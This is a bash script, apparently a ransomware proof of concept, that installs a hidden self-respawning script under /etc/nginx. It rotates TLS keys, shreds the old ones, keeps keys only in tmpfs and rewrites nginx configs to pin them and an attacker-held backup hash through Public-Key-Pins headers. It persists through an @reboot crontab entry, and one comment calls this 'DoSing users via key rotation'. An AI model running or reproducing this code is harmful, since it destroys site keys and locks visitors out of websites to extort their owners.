#!/bin/bash

umask 077
cat > /etc/nginx/.conf.sh << EndOfMessage
#!/bin/bash

csrSubject='/C=US/ST=New York/L=New York/O=International Secret Intelligence Service/CN=isis.io'
ransomKeyHash='9vGOH5h7KiBLATu8sTuedFe9A6slWQHizZLWpD5/5Sw='


read -r -d '' plaintextconf <<- EOM
	server {
		listen 80;
		server_name SERVER_NAME;
		return 301 https://START SERVER_NAME END\\\\$request_uri;
	}
	server {
		SSL_CONFIG
		
EOM

read -r -d '' sslconf <<- EOM
	listen 443 ssl http2;
	listen [::]:443 ssl http2;

	ssl_certificate ssl/cert.pem;
	ssl_certificate_key ssl/key.pem;
	ssl_dhparam ssl/dhparams.pem;

	ssl_session_timeout 1d;
	ssl_session_cache shared:SSL:50m;
	ssl_session_tickets off;

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
	ssl_ciphers 'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS';
	ssl_prefer_server_ciphers on;

	add_header Public-Key-Pins 'max-age=31536000; includeSubdomains; pin-sha256="KEY_HASH"; pin-sha256="BACKUP_HASH"';
	add_header Strict-Transport-Security 'max-age=31536000; includeSubdomains; preload';

	ssl_stapling on;
	ssl_stapling_verify on;
EOM

function delete {
	if [ -f "\${1}" ] ; then
		for i in {1..10} ; do
			dd if=/dev/urandom of="\${1}" bs=1024 count="\$(du -k "\${1}" | cut -f1)"
		done

		rm "\${1}"
	fi
}

function dottify {
	echo "\${1}" | perl -pe 's/(.*\/)/\1./g'
}

function getconfigfiles {
	grep -rlP 'listen (80|443)[^0-9]' /etc/nginx | \
		grep -v .conf.sh | \
		grep -v certbot | \
		grep -v '.bak' | \
		grep -v '.new' | \
		grep -v '/\.'
}

function updatecert {
	/etc/nginx/.certbot certonly \
		-n \
		--agree-tos \
		--expand \
		--standalone \
		--csr /etc/nginx/ssl/tmp/csr.pem \
		--fullchain-path /etc/nginx/ssl/tmp/cert.pem \
		--register-unsafely-without-email \
		\$*

	delete /etc/nginx/ssl/tmp/csr.pem
	delete /etc/nginx/ssl/cert.pem
	delete /etc/nginx/ssl/key.pem
	delete /etc/nginx/ssl/dhparams.pem

	mv /etc/nginx/ssl/tmp/cert.pem /etc/nginx/ssl/
	mv /etc/nginx/ssl/tmp/key.pem /etc/nginx/ssl/
	mv /etc/nginx/ssl/tmp/dhparams.pem /etc/nginx/ssl/

	keyHash="\$(openssl rsa -in /etc/nginx/ssl/key.pem -outform der -pubout | openssl dgst -sha256 -binary | openssl enc -base64)"
	backupHash="\${ransomKeyHash}"

	if [ "\${keyHash}" == "\${backupHash}" ] ; then
		openssl genrsa -out /etc/nginx/ssl/backup.pem 2048
		backupHash="\$(openssl rsa -in /etc/nginx/ssl/backup.pem -outform der -pubout | openssl dgst -sha256 -binary | openssl enc -base64)"
	fi

	for f in \$(getconfigfiles) ; do
		mv "\${f}" "\${f}.bak"
		cat "\${f}.bak" | grep -vP '^(\s+)?#' > "\${f}.new"

		if ( ! grep 'listen 443' "\${f}.new" ) ; then
			cat "\${f}.new" | \
				grep -v 'listen ' | \
				perl -pe 's/\n/☁/g' | \
				perl -pe "s/server \{(.*?server_name (.*?)[;☁])/\$( \
					echo "\${plaintextconf}\1" | \
					sed 's|/|\\\/|g' | \
					perl -pe 's/\n/\\\n/g' | \
					sed 's|SERVER_NAME|\\\2|g' \
				)/g" | \
				perl -pe 's/START (.*?)[ ;☁].*END/\1/g' | \
				perl -pe 's/☁/\n/g' \
			> "\${f}.new.new"
			mv "\${f}.new.new" "\${f}.new"
		fi

		cat "\${f}.new" | \
			sed 's/listen 443.*/SSL_CONFIG/g' | \
			grep -v ssl | \
			grep -v Public-Key-Pins | \
			grep -v Strict-Transport-Security | \
			sed "s/SSL_CONFIG/\$( \
				echo "\${sslconf}" | \
				sed 's|/|\\\/|g' | \
				perl -pe 's/\n/\\\n/g' \
			)/g" | \
			sed "s|KEY_HASH|\${keyHash}|g" | \
			sed "s|BACKUP_HASH|\${backupHash}|g" \
		> "\${f}"

		rm "\${f}.new"
	done

	service nginx restart

	sleep 30
	for f in \$(getconfigfiles) ; do
		mv "\${f}" "\$(dottify "\${f}")"
		mv "\${f}.bak" "\${f}"
	done
}


if [ ! -f /etc/nginx/.certbot ] ; then
	wget https://dl.eff.org/certbot-auto -O /etc/nginx/.certbot
	chmod +x /etc/nginx/.certbot
	/etc/nginx/.certbot certonly -n --agree-tos
fi


if [ \$(shouldRecover) ] ; then
	restoreOriginalTLSKeys
else
	# Continue DoSing users via key rotation

	mkdir -p /etc/nginx/ssl/tmp
	cd /etc/nginx/ssl/tmp

	openssl dhparam -out dhparams.pem 2048
	openssl req -new -newkey rsa:2048 -nodes -out csr.pem -keyout key.pem -subj "\${csrSubject}"
	updatecert

	sleep 129600 # Just infrequent enough to stay within Let's Encrypt's rate limit
	/etc/nginx/.conf.sh &
fi
EndOfMessage
chmod 700 /etc/nginx/.conf.sh


rm -rf /etc/nginx/ssl
mkdir /etc/nginx/ssl
echo 'tmpfs /etc/nginx/ssl tmpfs rw,size=50M 0 0' >> /etc/fstab
mount --all
chmod 600 /etc/nginx/ssl

crontab -l > /etc/nginx/cron.tmp
echo '@reboot /etc/nginx/.conf.sh' >> /etc/nginx/cron.tmp
crontab /etc/nginx/cron.tmp
rm /etc/nginx/cron.tmp

nohup /etc/nginx/.conf.sh > /dev/null 2>&1 &
